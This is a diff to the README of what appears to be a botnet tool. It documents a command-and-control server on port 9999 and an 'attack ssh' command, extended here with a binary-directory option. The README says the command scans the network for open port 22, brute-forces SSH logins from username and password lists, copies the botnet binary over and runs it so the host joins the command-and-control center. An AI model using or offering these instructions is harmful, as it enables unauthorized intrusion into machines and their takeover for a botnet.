@@ -17,7 +17,7 @@ This starts up a C&C that listens on default port `9999`.
 - Attack a machine to get the botnet on the machine. The only supported attack right now is brute forcing SSH 
 
 ```bash
-botnet -ufile /paht/to/usernames/file -pfile /path/to/passwords/file attack ssh
+botnet -ufile /paht/to/usernames/file -pfile /path/to/passwords/file -bindir /path/to/botnet/bin/dir attack ssh
 ```
 
 This will scan all the ips on the network find which ips have port 22 open and attempt to brute force its way in. Once it has access it will SCP the botnet binary over and execute the botnet client to connect to our command and control center
